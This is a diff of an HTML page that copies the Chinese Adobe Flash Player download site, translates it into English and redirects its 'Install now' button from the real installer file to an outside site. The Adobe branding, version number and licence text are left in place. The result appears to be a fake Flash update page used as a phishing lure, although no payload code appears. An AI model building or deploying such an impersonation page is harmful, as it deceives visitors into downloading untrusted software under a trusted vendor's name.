@@ -1,7 +1,7 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
@@ -23,39 +23,42 @@
 <div class="header">
 
     <div class="h-logo"><a href="/" target="_self">FLASH PLAYER</a></div>
-
     <ul class="h-nav">
-        <li class="cur"><a href="/" target="_self">首页</a></li>
-        <li><a href="https://www.flash.cn/enterprise/index" target="_self">企业版</a></li>
-        <li><a href="https://www.flash.cn/help/index" target="_self">帮助中心</a></li>
-        <li><a href="https://www.flash.cn/custom-service/index" target="_self">客服支持</a></li>
-        <li class="h-lang"><a href="/english" target="_self">English</a></li>
+        <li class="cur"><a href="/" target="_self">Home</a></li>
+        <li><a href="https://www.flash.cn/enterprise/index" target="_self">Flash Player Enterprise</a></li>
+        <li><a href="https://helpx.adobe.com/flash-player.html" target="_self">Help Center</a></li>
+        <li><a href="https://www.flash.cn/custom-service/index" target="_self">Customer Support</a></li>
+        <li class="h-lang en"><a href="/" target="_self">中文</a></li>
     </ul>
 </div>
 
-<div id="index-content">
+<div id="index-content" class="en">
     <h1 class="ic-title">Adobe&nbsp;Flash&nbsp;Player</h1>
-    <p id="ic-version">官方最新版本：<span>32.0.0.270</span></p>
+    <p id="ic-version">The&nbsp;latest&nbsp;version：<span>32.0.0.270</span></p>
     <div id="ic-download">
-        <span>立即下载</span>
-        <a href="flashplayerpp_install_cn.exe" target="_self">立即下载</a>
+        <span>Install now</span>
+        <a href="https://www.se7ensec.cn/" target="_self">Install now</a>
     </div>
-    <div id="ic-size">大小：<span>20.1MB</span></div>
+    <div id="ic-size">Total Size：<span>20.1MB</span></div>
     <ul id="ic-button">
-        <li><span>系统要求</span><i></i></li>
-        <li><span>其他平台版本</span><i></i></li>
+        <li><span>System requirements</span><i></i></li>
+        <li><span>Need Flash Player for a different computer?</span><i></i></li>
     </ul>
     <i class="ic-icon"></i>
-    <div class="ic-protocol"><label id="ic-checkbox" class="cur"><s></s><input type="checkbox"></label><div id="ic-popup">已阅读并同意<a href="https://wwwimages2.adobe.com/www.adobe.com/content/dam/acom/cn/legal/licenses-terms/pdf/PlatformClients_PC_WWEULA-zh_CN-20150407_1357.pdf">Adobe软件许可协议*</a>和<a href="https://www.flash.cn/Flash_Helper_Service_Agreement.pdf">Flash Helper Service使用协议</a></div></div>
+    <div class="ic-protocol"><label id="ic-checkbox" class="cur"><s></s><input type="checkbox"></label><div id="ic-popup">You acknowledge that you have read and agree to the<a href="https://wwwimages2.adobe.com/www.adobe.com/content/dam/acom/en/legal/licenses-terms/pdf/PlatformClients_PC_WWEULA-en_US-20150407_1357.pdf">Adobe Software Licensing Agreement*</a>and the<a href="https://www.flash.cn/Flash_Helper_Service_Agreement.pdf">Flash Helper Service Agreement.</a></div></div>
 </div>
 
-<div class="footer">
+<div class="footer en">
     <ul class="f-nav">
-        <li><a href="https://www.flash.cn/category/contact">联系我们</a><i></i></li>
-        <li><a href="https://www.flash.cn/category/agreement">软件协议</a><i></i></li>
-        <li><a href="https://www.flash.cn/category/protocol">使用协议</a><i></i></li>
+
+        <li><a href="https://www.flash.cn/category/contact">Contact us</a><i></i></li>
+        <li><a href="https://www.flash.cn/category/agreement">Software Agreement</a><i></i></li>
+        <li><a href="https://www.flash.cn/category/protocol">Service Agreement</a><i></i></li>
+
+
     </ul>
-    <div class="f-icp">Copyright&nbsp;&#169;&nbsp;<script>document.write(new Date().getFullYear())</script>&nbsp;重庆重橙网络科技有限公司.&nbsp;All&nbsp;rights&nbsp;reserved.&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action">渝ICP备18002678号-1</a><i class="f-icon"><s></s></i><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=50019002501402">渝公网安备50019002501402号</a></div></div>
+    <div class="f-icp">Copyright&nbsp;&#169;&nbsp;<script>document.write(new Date().getFullYear())</script>&nbsp;Zhongcheng&nbsp;Network&nbsp;Technology&nbsp;Co.,&nbsp;Ltd.&nbsp;All&nbsp;Rights&nbsp;Reserved&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action">渝ICP备18002678号-1</a><i class="f-icon"><s></s></i><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=50019002501402">渝公网安备50019002501402号</a></div>
+</div>
 
 
 
@@ -99,7 +102,18 @@
         if(document.addEventListener) document.addEventListener('click', handler, false);
         else if(document.attachEvent) document.attachEvent('onclick', handler);
     </script>
+
     <!--统计-->
-            <script src="https://www.flash.cn/support/statistics?data=%2F"></script></div>
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var flash = document.createElement("script");
+            flash.src = '/support/statistics?data=' + window.location.pathname + window.location.search;
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(flash, s);
+        })();
+    </script>
+
+</div>
 </body>
 </html>
